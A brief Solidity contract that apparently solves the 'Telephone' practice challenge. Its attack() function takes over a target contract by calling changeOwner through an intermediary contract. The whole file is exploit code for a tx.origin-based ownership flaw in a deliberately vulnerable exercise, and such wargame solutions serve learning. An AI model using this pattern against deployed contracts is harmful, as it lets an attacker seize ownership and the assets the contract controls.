pragma solidity ^0.8.0;
import "./telephone.sol";

contract attacktelephone {
    Telephone public deployedContract;
    address public owner;

    constructor( address _deployedContractAddr) public {
        deployedContract = Telephone(_deployedContractAddr);
        owner = msg.sender;
    }

    function attack() public{
        deployedContract.changeOwner(owner);
    }
}
